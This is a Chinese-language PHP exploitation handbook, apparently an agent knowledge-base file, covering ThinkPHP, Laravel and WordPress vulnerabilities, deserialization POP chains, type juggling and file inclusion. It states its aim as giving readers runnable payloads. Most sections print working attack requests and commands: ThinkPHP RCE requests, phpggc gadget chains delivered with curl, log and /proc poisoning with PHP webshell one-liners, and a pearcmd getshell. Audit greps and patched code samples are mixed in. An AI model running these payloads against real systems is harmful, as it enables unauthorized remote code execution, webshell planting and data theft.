---
name: kb-php-audit-deep
description: PHP 框架审计与反序列化 POP 链纵深手册：ThinkPHP/Laravel/WordPress 漏洞模式、弱类型绕过、POP 链四步构造法、文件包含链、2024-2026 真实 CVE 复现（含 PoC 与修复对比）
tags: [PHP, 代码审计, 反序列化, POP链, ThinkPHP, Laravel, WordPress, 弱类型, LFI, CVE]
date: 2026-08-14
---

# PHP 框架审计与反序列化 POP 链（纵向纵深手册）

> 定位：比 `kb_code_audit_source_2026.md`（通用方法论）深一层的 **PHP 专攻**。受众：已懂黑盒/基础白盒，要拿 PHP 框架具体漏洞模式 + 可直接打的可运行 payload。前置知识：PHP 魔术方法、序列化格式、HTTP 方法覆盖。
> 总纲：**入口点 → 变量可控性 → 危险函数 → 过滤绕过 → 黑盒验证**，五步闭环，缺一不可。

## 1. 审计五步纵深流程

```
① 入口点    →  ② 可控性   →  ③ 危险函数   →  ④ 过滤绕过   →  ⑤ 黑盒验证
路由/参数       用户可达?        eval/system/         黑名单/白名单/       Burp 重放 +
方法覆盖/文件     含 _GET/_POST/  unserialize/         正则/类型转换         DNSLog/回显
_METHOD/header    _FILES/JSON    include/file_put/     大小写/编码/数组/    确认真实影响
```

**入口点清单**（PHP 特有）：
- 方法覆盖 `_method`（ThinkPHP 5.x 经典洞根因）
- `$_GET/$_POST/$_REQUEST/$_COOKIE/$_FILES` 全量收集，`grep -rnE "\$(GET|POST|REQUEST|COOKIE|FILES)"`
- 路由参数：ThinkPHP `s=`、Laravel `Route::`、WordPress `?page=`/`admin-post.php`
- JSON body：`json_decode(file_get_contents('php://input'))` → 类型可控（数组/布尔）
- Header：`User-Agent`/`Referer`/`X-Forwarded-For`/`X-XSRF-TOKEN` 入日志/解密链

**可控性判定**：source 是否到达 sink 前被净化（`intval`/`htmlspecialchars`/白名单 in_array）。净化函数本身可绕过（见 §5/§4）才算可控。

## 2. ThinkPHP 系列 RCE 链

### 2.1 5.0.x 任意代码执行（CVE-2018-1002015 系，filter 变量覆盖）

**漏洞根因**：`think\Request::method()` 用 `_method` 调用任意方法，进而 `__construct` 覆盖 `filter` 成员，`filterValue()` 把过滤函数交给 `call_user_func`。

```php
// thinkphp/library/think/Request.php（漏洞版核心）
public function method() {
    // $varMethod 默认 '_method'，POST 可控制 $this->method = '__construct'
    $method = strtoupper($this->post(Config::get('var_method')));
    ...
    $this->{$this->method}($_POST);   // ← 调用任意方法，实为 __construct($_POST)
}
protected function filterValue(&$value, $key, $filters) {
    $result = call_user_func($filter, $value);  // ← filter=system → 命令执行
}
```

**可运行 PoC（5.0.0~5.0.23，POST /）**：
```http
POST /index.php?s=captcha HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

_method=__construct&filter[]=system&server[REQUEST_METHOD]=id&method=get
```
- `_method=__construct`：触发 `__construct($_POST)` 覆盖 `filter=system`、`server[REQUEST_METHOD]=id`
- `method=get`：绕过路由 `check()` 需要 method 为合法值
- 无 captcha 时改用带 GET 路由的任意路径；命令回显在响应中

**补丁后绕过（5.1.x ≤5.1.32）**：官方把 `_method` 限为合法 HTTP 方法，但 `filter` 仍可直达：
```http
POST /index.php HTTP/1.1

a=system&b=id&_method=filter      # _method=filter 未在黑名单 → filterValue 触发
# 通用链: c=exec&f=calc.exe&_method=filter
```

### 2.2 5.0.x invokefunction（CVE-2019-9082，≤3.2.4 / 部分 5.x）

```http
GET /index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
```
`invokefunction` 把 `vars[0]` 作函数、`vars[1]` 作参数数组 → `call_user_func_array('system', ['whoami'])`。

### 2.3 5.0.24 模板文件包含 RCE（CVE-2025-63888，2025 新爆）

**根因**：`think\template\driver\File::read()` 把用户可控的模板路径直接 `file_get_contents` + `include`（CWE-98）。

```php
// thinkphp/library/think/template/driver/File.php
public function read($file) {
    $cacheFile = $this->cacheFile($file);      // 模板路径可控 → 目录穿越
    return $cacheFile ? file_get_contents($cacheFile) : false;
}
```
**利用链**：LFI 读日志 → 日志投毒（User-Agent 写 `<?php system($_GET[1]);?>`）→ 包含 `/storage/logs/*.log` → getshell；或直接读任意文件（CVE-2025-63889 是同一函数的任意文件读）。配合 §7 日志包含手法使用。

### 2.4 6.0 反序列化 RCE（CVE-2024-44902 / CVE-2024-48112）

**影响**：ThinkPHP 6.1.3~8.0.4，需安装 Memcached 扩展，入口 `/?data=` 触发 `unserialize`。
**链**：`ResourceRegister → DbManager → Memcached → Pivot → Model`，最终走 `__toString`/`__destruct` 到 `system`。

```bash
# 判定指纹：响应头/报错含 thinkphp 或路由 s= 特征
# PoC 生成（phpggc 有 TP 链）：
./phpggc ThinkPHP/RCE4 system 'cat /flag' --url
# 打点（URL 编码后拼到 data 参数）：
curl -X POST 'http://target/?data=' --data-urlencode "$(phpggc ThinkPHP/RCE4 system id)"
```

**审计切入点**：`grep -rnE "unserialize|json_decode.*true|var_export"` 找入口；确认 PHP 版本 ≥7.1 才能走 `__unserialize`/属性个数绕过（`C:1:"A":123:{...}` 绕过 `__wakeup` 是 7.0 前技术）。

### 2.5 审计清单（ThinkPHP）

| 版本 | 重点模式 | 入口 |
|------|---------|------|
| ≤5.0.23 / ≤5.1.32 | `_method` 变量覆盖 → filter | POST `_method` |
| ≤3.2.4 | `invokefunction` | `s=index/\think\app/invokefunction` |
| 5.0.24 | 模板路径文件包含 | `view()`/`fetch()` 可控 |
| 6.1.3~8.0.4 | unserialize（需 memcached） | `/?data=` |
| 任意 | 反序列化入口 `unserialize($_GET/$_POST)` | 自研 controller |

## 3. Laravel 系列

### 3.1 Debug 模式 RCE：CVE-2021-3129（Ignition）

**影响**：Laravel <8.4.2 + `APP_DEBUG=true`，Ignition <2.5.2。未认证 RCE，CISA KEV 收录。

**利用链（四步）**：
```
① 路径穿越: _ignition/execute-solution 端点任意文件读/写（solution 功能 file_get/put_contents 路径校验缺陷）
② 日志投毒: 触发异常把恶意序列化串写进 storage/logs/laravel.log
③ PHAR 反序列化: phar:// 流包装读该 log，自动反序列化 metadata
④ POP 链: phpggc Monolog RCE1 → system 命令执行
```

```bash
# 探测 debug 开启:
curl -s http://target/_ignition/execute-solution -o /dev/null -w "%{http_code}"
# 日志包含+投毒 PoC（fiddler/burp 发原始包）:
# 1) POST 一个会让 Exception 序列化进日志的请求（构造 log 内容含 payload）
# 2) 再 GET:  /_ignition/execute-solution?solution=...&file=phar://storage/logs/laravel.log/test
# 最终触发 phpinfo/exec 验证
```

**审计切入点**：`composer.lock` 查 `facade/ignition` 版本；`.env` 是否 `APP_DEBUG=true`。修复对比：Ignition ≥2.5.2 对 solution file 做白名单 + `path_join` 规范化。

### 3.2 APP_KEY 泄露 → Cookie 反序列化 RCE（CVE-2018-15133 + 2024 活体）

**根因**：`Illuminate\Encryption\Encrypter::decrypt()` 对解密结果直接 `unserialize`。只要拿到 `APP_KEY`（base64 32 字节）→ 任意反序列化 → RCE。GitGuardian 2024 研究：GitHub 泄露 26 万个 APP_KEY，600+ 应用可被秒打。

```php
// Illuminate/Encryption/Encrypter.php
public function decrypt($payload, $unserialize = true) {
    ...
    $decrypted = openssl_decrypt($decoded['value'], ...);
    return $unserialize ? unserialize($decrypted) : $decrypted;  // ← RCE 点
}
```

```bash
# 1. 确认 APP_KEY 泄露（源码/.env/.git/报错页/环境变量接口）
# 2. phpggc 生成 Laravel RCE payload:
php phpggc Laravel/RCE5 system 'id'
# 3. 用 APP_KEY 对 payload 做 AES-256-CBC+HMAC 加密（gen_laravel_cookie.py）→ 得伪造 cookie
# 4. 注入:
curl -H "Cookie: XSRF-TOKEN=<加密payload>" http://target/
#   或 cookie 驱动 session (SESSION_DRIVER=cookie, CVE-2024-55556 变体仍在打)
```

**影响面放大（2024-2025）**：
- **CVE-2024-48987（Snipe-IT）/ CVE-2024-55555（Invoice Ninja）**：APP_KEY 硬编码/泄露 → 同链 RCE
- **CVE-2025-54068（Laravel Livewire ≤3.6.3）**：未认证 RCE，2025 大规模薅 .env 凭据，超 6000 应用被黑，升级 3.6.4+ 修复

### 3.3 env 泄露 → 凭证链

Laravel 常见信息泄露：`/.env` 未加防护直读（含 `DB_PASSWORD`/`APP_KEY`/`AWS_` 密钥）→ APP_KEY 转 RCE、DB 转拖库。**审计切入点**：Nginx/Apache 配置是否 exclude `.env`；`.git` 是否暴露；debug 页 `Whoops` 是否吐环境变量。

## 4. WordPress 插件审计

### 4.1 五大高发模式（2024-2025 实锤 CVE 对照）

| 模式 | 根因代码 | 2024-25 实锤 |
|------|---------|-------------|
| SQLi | 参数拼接 + 无 `$wpdb->prepare` | CVE-2024-27956 WP-Automatic（5500万次攻击）; CVE-2025-10003 UsersWP; CVE-2024-12410 Front End Users |
| 任意上传 | 缺文件类型校验/路径拼接 | CVE-2025-2005 Front End Users(9.8); CVE-2024-28890 Forminator; Everest Forms(9.8) |
| 存储/反射 XSS | 缺 escaping `esc_html/esc_attr` | CVE-2025-26877; CVE-2024-13569 Front End Users |
| 文件包含 | `include($path)` 用户可控 | Craft CMS CVE-2025-32432（Yii 链）|
| 反序列化 | `unserialize` 用户输入 | 多插件（Backup Migration CVE-2024-10932）|

### 4.2 审计切入点（10 分钟出活）

```bash
# ① 高危函数全局索引
grep -rniE "eval|assert|system\(|shell_exec|exec\(|base64_decode|unserialize|maybe_unserialize" wp-content/plugins/<plugin>/
# ② SQLi 三连: 找非 prepare 的查询
grep -rniE '\$wpdb->(query|get_results|get_var|get_row)\(.*\$_(GET|POST|REQUEST)' wp-content/plugins/
# ③ 上传缺校验
grep -rniE "move_uploaded_file|wp_handle_upload" wp-content/plugins/ | grep -vi "check_and" 
# ④ 未校验 nonce/权限 的 admin-post 处理器
grep -rniE "admin_post_|check_ajax_referer|wp_ajax_" wp-content/plugins/
# ⑤ 回调/过滤器参数是否 escape
grep -rniE "echo|print" wp-content/plugins/ | grep -iE '\$(GET|POST|REQUEST|input)'
```

**关键审计点**：
- **AJAX handler**：`wp_ajax_nopriv_*`（未登录可触发）是最高价值入口——无 nonce 校验即未授权业务操作
- **短代码 shortcode**：属性参数常直接进 SQL/HTML 未净化
- **上传目录可执行**：`/uploads/*.php` 若能直连 = 上传即 RCE；检查 `.htaccess` 是否禁 php
- **`maybe_unserialize`**：对 `$_POST` 数据调用 → 反序列化入口，配合插件内 gadget

### 4.3 漏洞代码 + 修复对比（SQLi 例）

```php
// 漏洞版
$uid = $_GET['uid'];
$rows = $wpdb->get_results("SELECT * FROM {$wpdb->prefix}users WHERE ID = $uid");  // 注入

// 修复版
$uid = intval($_GET['uid']);
$rows = $wpdb->get_results($wpdb->prepare(
    "SELECT * FROM {$wpdb->prefix}users WHERE ID = %d", $uid));
```

**判定门槛**：插件内 gadget（`__destruct` 类）存在 + `maybe_unserialize` 入参可控 + 无 nonce = 实锤 POP 链；只有 escape 缺失且低权限利用 = 降级。

## 5. 弱类型绕过（type juggling）

### 5.1 == vs === 经典绕过（PHP <8.0）

```php
// 审计点: 所有 == 比较（非 ===），尤其密码/HMAC/签名校验
if ($_POST['pass'] == $admin_pass) { }        // 漏洞
if (hash_equals($sig, $_POST['sig'])) { }     // 修复: 恒定时间+严格类型

// == 真值表（PHP 7.x 及以前）
"0" == 0          // true
"abc" == 0        // true  非数字串转 0
"1abc" == 1       // true  取前导数字
"admin1" == 0     // true  非数字开头→0
true == "任意串"   // true
null == ""        // true
```

### 5.2 MD5/SHA1 0e 魔数哈希

```bash
# 哈希以 0e 开头且全数字 → 科学计数法 0*10^N = 0 → 两哈希 == 相等
md5('240610708')  # 0e462097431906509019562988736854
md5('QNKCDZO')    # 0e830400451993494058024219903391
md5('240610708') == md5('QNKCDZO')  # true
# 爆破更多: 本地 php -r 循环找 md5/sha1 0e 开头串
```

**PHP 8.0 变化**：`"abc" == 0` 变 false，0e 攻击失效；但**剩余利用面**仍在：
- `"0" == "0.0"` 仍 true；`true == "任意串"` 仍 true
- JSON 输入类型混淆：`{"pass": true}` → `true == "abc"` true
- `strcmp($input, $secret) == 0` 传数组 → strcmp 返回 NULL，`NULL == 0` true（PHP 8 仍有效）

```http
# JSON 登录绕过（弱比较 + json_decode）:
POST /api/login HTTP/1.1
Content-Type: application/json
{"username":"admin","password":true}     # true == 任意哈希串 → 绕过
# 或 password 传数组: {"password":[]}  → strcmp 返回 NULL
```

**修复对比**：一律 `hash_equals()`；`in_array($k,$arr)` 加第三个参数 `true`；`json_decode` 后校验 `is_string`。

## 6. 反序列化 POP 链构造四步法

### 6.1 四步总纲

```
① 找链头 (entry)      __destruct / __wakeup / __unserialize / __toString 在对象销毁/字符串化时自动触发
② 找链中 (bridge)     __call / __get / __set / __invoke 魔术方法做方法代理，把不可达方法"转发"
③ 找 sink             eval/assert/system/call_user_func/include/file_put_contents/unlink/curl_exec
④ 构造 PoC            用 php -r 生成序列化串，本地跑通后再打目标
```

### 6.2 演示：手工构造完整 POP 链

假设目标代码（框架类库内）：
```php
// ① 链头 __destruct
class A {
    public $obj;                  // 可注入任意对象
    function __destruct() {
        echo $this->obj;          // 触发 $obj->__toString()
    }
}
// ② 链中 __toString
class B {
    public $call;                 // 可注入方法名
    public $args;                 // 可注入参数
    function __toString() {
        return call_user_func($this->call, $this->args);  // 转发到任意函数
    }
}
// sink = system
```

```php
// PoC 生成器（本地 php -r）
$p = 'O:1:"A":1:{s:3:"obj";O:1:"B":2:{s:4:"call";s:6:"system";s:4:"args";s:2:"id";}}';
echo serialize(unserialize($p)) . "\n";   // 触发 __destruct → __toString → system('id')
echo $p;                                   // 直接投递此串
```
**关键点**：属性访问级别（private 属性序列化会带类名前缀 `\0ClassName\0`），构造时用 `ReflectionProperty` 或直接按格式手写；`--fast-destruct`（phpggc）可跳过部分 `__wakeup`。

### 6.3 真实框架 gadget 演示

**phpggc（PHP 版 ysoserial，支持 TP/Laravel/Yii/Symfony/Monolog/WordPress 等）**：
```bash
./phpggc --list
./phpggc Laravel/RCE5 system 'id' --url          # Laravel 链（配合 APP_KEY）
./phpggc ThinkPHP/RCE4 system 'cat /flag' --url  # ThinkPHP 链
./phpggc Monolog/RCE1 system 'whoami'            # Monolog（CVE-2021-3129 用）
./phpggc Symfony/RCE1 system id --fast-destruct  # 绕过 __wakeup
```

**ThinkPHP 6.0.8 链解剖（学习模板）**：
```
__destruct(Model, lazySave=true)
 → save() → updateData()/insertData()
 → db() 里字符串拼接 $this->table / $this->suffix → __toString 触发
 → removeFiles() → file_exists($filename=对象) → __toString
 → 类缺 visible() 方法 → __call → hook[method] → call_user_func
 → filterValue → system
```

**CVE-2024-44902 链解剖**：`ResourceRegister __destruct → DbManager → Memcached(扩展) → Pivot → Model`，入口 `unserialize($data)`。

**构造方法（无 phpggc 时手工）**：
1. `grep -rln "__destruct\|__wakeup\|__toString"` 全库找候选类
2. 对每个链头方法体做**反推**：它调用哪些属性？该属性类型能否指向其他类？
3. 用 phpggc 的 `gadgetchains/` 源码当参考模板（`gadgetchains/Laravel/RCE/3/chain.php` 等）
4. 生成器里 `echo serialize(...)`，注意 private/protected 前缀，本地 `php -d error_reporting=E_ALL` 跑通

**坑与绕过**：
- `__wakeup` 属性数绕过（`C:1:"A":1:...` 改类内属性数）仅 PHP <7.0
- 对象属性少（partial object）会触发 `__wakeup`，用 `--fast-destruct` 或构造完整属性
- PHP 7.4+ phar 反序列化需 `phar.readonly=0` 才能本地生成 phar，打点只需目标 `phar://`
- `unserialize` 前的 `is_valid_md5`/正则过滤 → phpggc `--ascii`/`--plus-numbers` 变形绕过

## 7. 文件包含链（LFI → RCE）

### 7.1 pearcmd.php getshell（Docker 环境通杀）

**前置**：pear 已装（Docker PHP 镜像默认有 `/usr/local/lib/php/pearcmd.php`）+ `register_argc_argv=On`（Docker 默认开）。`file=` 参数可任意 include。

```http
# 把 PHP 一句话写入 /tmp/shell.php（含 < 和 > 需 Burp 原始包/URL 编码）
GET /index.php?file=/usr/local/lib/php/pearcmd.php/&+config-create+/&/<?=phpinfo()?>+/tmp/shell.php
# 再包含执行:
GET /index.php?file=/tmp/shell.php
# 或直接写进 web 根目录: ...+/&/<?php eval($_POST[a]);?>+/var/www/html/shell.php
```
**要点**：`+` 即空格；`config-create` 参数 1=内容、参数 2=输出文件；`&` 分隔参数。可直接下载远程文件（`remote` 命令）实现 RFI 变体。

### 7.2 php://filter 转换链（无 RCE 时读源码/任意文件）

```http
GET /index.php?file=php://filter/convert.base64-encode/resource=config.php
# 带后缀拼接时（include($f.'.php')）: 用 %00 截断(仅<5.3) 或 filter 包 .php 不生效问题 → 转 base64 绕过执行
# 多级 filter 链构造可读不含 .php 的受限文件:
php://filter/convert.iconv.UTF-8.CSISO2022KR|convert.base64-encode/resource=....//....//etc/passwd
# 7.4 之前 filter 链可组合 iconv 转换达到"filter-based RCE"（无文件写 RCE 技术）
```

### 7.3 日志 / Session / /proc 包含

```bash
# 日志投毒（Apache/Nginx access.log）: User-Agent 注入 PHP
curl -A '<?php system($_GET[1]);?>' http://target/phpinfo.php
curl 'http://target/index.php?file=/var/log/apache2/access.log&1=id'
# Session 包含: 可控 session 数据（登录用户名等）写入 /var/lib/php/sessions/sess_<PHPSESSID>
curl 'http://target/index.php?file=/var/lib/php/sessions/sess_abc&x=<?php system(id);?>'
# /proc/self/environ: UA 注入后直接包含（环境变量含 UA）
curl -A '<?php system($_GET[1]);?>' 'http://target/index.php?file=/proc/self/environ&1=id'
```

### 7.4 条件竞争（先写后含）

上传校验严格时：先上传内容为 PHP 的文件（命名 .jpg），抢在校验/移动前的窗口包含 → **条件竞争 getshell**。同理 `.user.ini`（CGI 模式）`auto_prepend_file=shell` + 图片马二次渲染绕过。

### 7.5 修复对比

```php
// 漏洞版
include($_GET['page'] . '.php');
// 修复版
$allowed = ['home', 'about'];
$page = basename($_GET['page']);
if (!in_array($page, $allowed, true)) die('forbidden');
include(__DIR__ . "/pages/{$page}.php");
// 另: allow_url_include=Off; 禁用 php:// phar:// zip:// data://; 日志目录不可读
```

## 8. 2024-2026 真实 CVE 速查与复现要点

| CVE | 产品/版本 | 类型 | 复现要点 |
|-----|----------|------|---------|
| CVE-2024-44902 | ThinkPHP 6.1.3~8.0.4 | 反序列化 RCE(9.8) | `/?data=` + memcached 扩展; phpggc ThinkPHP 链 |
| CVE-2024-48112 | ThinkPHP 6.1.3~8.0.4 | 反序列化 RCE(9.8) | `\controller\Index` 组件; 同 44902 链 |
| CVE-2025-63888 | ThinkPHP 5.0.24 | 模板文件包含→RCE(9.8) | `view()` 路径穿越 + 日志投毒 |
| CVE-2025-63889 | ThinkPHP 5.0.24 | 任意文件读(7.5) | `Template::fetch()` |
| CVE-2025-50706 | ThinkPHP 5.1 | routecheck RCE(9.8) | 路由检查变量覆盖 |
| CVE-2025-50707 | ThinkPHP 3.2.5 | index.php RCE(9.8) | invokefunction 变体 |
| CVE-2025-32432 | Craft CMS ≤5.6.16/4.14.14/3.9.14 | 未认证 RCE | `assets/generate-transform` + session 投毒 + Yii `FieldLayoutBehavior→PhpManager` 反序列化; 先拖 `.env` |
| CVE-2025-54068 | Laravel Livewire ≤3.6.3 | 未认证 RCE | phpggc 链 + 拖 .env; 6000+ 站 |
| CVE-2024-27956 | WP-Automatic <3.9.2.0 | SQLi→提权→RCE | 未认证时间盲注; 批量打 |
| CVE-2025-10003 | UsersWP ≤1.2.44 | SQLi(6.5) | `upload_file_remove` + `htmlvar` 未认证 |
| CVE-2025-2005 | Front End Users ≤3.2.32 | 任意上传 RCE(9.8) | 注册表单上传缺类型校验 |
| CVE-2024-48987 | Snipe-IT | APP_KEY→RCE | 泄露 APP_KEY → cookie 反序列化 |
| CVE-2024-55556 | Laravel 新版本 | cookie 会话反序列化 | SESSION_DRIVER=cookie 时 cookie 投递 phpggc 链 |

**复现顺序建议**：指纹（响应头/报错/路由特征/版本文件）→ 查上表 → 无回显用 DNSLog 外带（`dnslog.py probe`）→ 有回显直接验证命令。

## 9. 审计流程纵深与验证闭环

```
拿到源码
 ├─ 建索引: grep 危险函数 + 入口函数 → 文件:行号表
 ├─ 框架优先: 先确认 TP/Laravel/WP 版本 → 对照 §2/§3/§4 已知 CVE 链
 ├─ 未命中 → 自研代码: 入口→可控性→sink 五步流（§1）
 ├─ POP 链: grep 魔术方法 → §6 四步构造 → phpggc 加速
 └─ 验证闭环:
     ├─ 回显型: curl 带 payload → 响应含命令结果
     ├─ 盲注/盲执行: DNSLog 子域外带（回连 IP = 目标出口 = 证据）
     ├─ 文件型: 写文件后访问 / shell.php?1=id
     └─ 静态确认: composer.lock/版本文件锁定受影响版本
```

**判定门槛（写报告前必须过）**：
1. 可复现：同一请求多次稳定回显/回连
2. 有影响：RCE 出命令 / 反序列化执行 / SQLi 出数据 / 上传 getshell
3. 排除误报：净化函数是否真绕过（测大小写/编码/数组）；死代码（无路由）不算
4. 实证：保留完整 HTTP 请求 + 响应 / DNSLog 截图

## 10. 常见坑与绕过速查

- **== vs ===**：所有 `==` 敏感比较必测 JSON 类型混淆 + 0e + strcmp 数组
- **`in_array` 未加 true**：传数组/非数字串可能绕过白名单
- **`preg_replace /e` 修饰符**（<5.5）：第二个参数正则替换 → 代码执行（审计点）
- **`assert` 字符串**（PHP 7 前支持字符串）：`assert("$_GET[c]")` = RCE（7.2 后禁用字符串参数）
- **`create_function`**：字符串拼接函数体 → RCE
- **可变函数**：`$fn($_POST['a'])` → `$fn=system` 即 RCE
- **上传双写/大小写/.user.ini/二次渲染**：黑名单后缀的四种经典绕过
- **PHP 版本差异**：0e/`__wakeup` 绕过/`assert` 字符串在 PHP 7/8 的兼容性必须按目标版本判断
- **别停在线索**：单点过滤缺失不构成漏洞，必须闭环到命令/数据/文件的实际影响

## Sources

- ThinkPHP CVE 全览: https://app.opencve.io/cve/?vendor=thinkphp ; https://osv.dev/vulnerability/CVE-2025-50707
- ThinkPHP 5.x RCE 分析（_method/filter 构造）: https://mochazz.github.io/2019/04/09/ThinkPHP5漏洞分析之代码执行10/ ; https://blog.sucuri.net/2019/04/thinkphp-5-x-remote-code-execution.html
- CVE-2025-63888 利用库: https://github.com/AN5I/cve-2025-63888-exploit
- Laravel Ignition CVE-2021-3129: https://gitlab.com/gitlab-org/security-products/gemnasium-db/-/blob/master/packagist/facade/ignition/CVE-2021-3129.yml ; https://www.tenable.com/plugins/nessus/194503
- Laravel CVE-2018-15133（APP_KEY cookie 反序列化）: https://github.com/noraj/Larascript ; https://attackerkb.com/topics/G95JpYDkEZ/
- Laravel APP_KEY 泄露批量 RCE: https://blog.gitguardian.com/exploiting-public-app_key-leaks/
- PHP 反序列化新 gadget 链（Quarkslab）: https://blog.quarkslab.com/php-deserialization-attacks-and-a-new-gadget-chain-in-laravel.html
- phpggc: https://github.com/Ghost2097221/phpggc
- WordPress 2025 十大插件漏洞: https://www.siteguarding.com/security-blog/top-12-wordpress-plugin-vulnerabilities-of-2025-how-to-detect-and-fix-them/
- WordPress 批量利用技术深潜: https://dev.to/jeremy_libeskind_4bfdc99f/mass-exploitation-of-wordpress-vulnerabilities-a-technical-deep-dive-3a6c
- Craft CMS CVE-2025-32432 PoC: https://github.com/TheMursalin/CVE-2025-32432
- PHP 弱类型/type juggling: https://pentesterlab.com/glossary/php-type-juggling
- pearcmd LFI getshell: https://blog.csdn.net/banliyaoguai/article/details/141690703
- PHP LFI 技巧合集: https://raw.githubusercontent.com/qazbnm456/awesome-security-trivia/master/Tricky-ways-to-exploit-PHP-Local-File-Inclusion.md
